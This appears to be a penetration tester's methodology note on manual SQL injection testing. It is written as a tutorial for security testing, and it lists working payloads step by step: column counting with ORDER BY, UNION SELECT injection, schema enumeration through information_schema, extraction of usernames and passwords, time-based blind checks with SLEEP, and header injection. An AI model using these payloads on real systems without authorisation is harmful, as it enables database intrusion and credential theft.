# How I look for SQL Injection in real applications

This note describes my practical approach to identifying and confirming
SQL Injection vulnerabilities in web applications and APIs.

I focus on **manual testing and logic validation**, not automated payload spraying.

---

## 1. Initial Indicators

I start by checking whether user input affects SQL query logic.

Typical indicators:
- numeric parameters (id, order_id, product_id)
- sorting and filtering parameters
- search fields
- API parameters mapped to database queries

### Arithmetic check

Example:

id=2
id=2-1

If the application returns the same object (e.g. record with id=1),
this indicates unsanitized input and potential SQL evaluation.

---

## 2. Error and Behavior Analysis

I intentionally trigger SQL syntax errors to observe application behavior.

Examples:
'
"
')(

I look for:
- SQL error messages
- unexpected HTTP 500 responses
- changes in response structure or content

---

## 3. Column Count Detection (ORDER BY)

To prepare for UNION-based injection, I determine the number of columns.

Example:
order_id=1 ORDER BY 1
order_id=1 ORDER BY 2
order_id=1 ORDER BY 3


When the response breaks, I know the column limit.

---

## 4. UNION-based Injection Validation

Once column count is known, I test UNION SELECT.

Example:
order_id=-1 UNION SELECT 1,2,3,4 --


I identify:
- which columns are reflected
- which columns accept text data

---

## 5. Schema Enumeration

After identifying a reflected column, I enumerate database metadata.

### Tables
UNION SELECT 1,2,group_concat(table_name),4
FROM information_schema.tables --


### Columns
UNION SELECT 1,2,group_concat(column_name),4
FROM information_schema.columns
WHERE table_name='users' --


---

## 6. Data Extraction

Finally, I extract actual application data.

Example:
UNION SELECT 1,2,username,4 FROM users --
UNION SELECT 1,2,password,4 FROM users --

At this stage the vulnerability is confirmed.

---

## 7. Blind SQL Injection Scenarios

If no data is reflected, I test blind techniques.

### Boolean-based
id=1 AND 1=1
id=1 AND 1=2


### Time-based
id=1 AND SLEEP(5)


Response timing differences confirm injection.

---

## 8. Non-obvious Injection Points

I also test:
- HTTP headers (User-Agent, X-Forwarded-For)
- JSON request bodies
- secondary parameters (sorting, filtering, export options)

Example:
User-Agent: ' OR SLEEP(5)--


---

## Notes

- I avoid relying on error messages alone
- I always confirm injection with **behavioral proof**
- Automated scanners are used only after manual confirmation
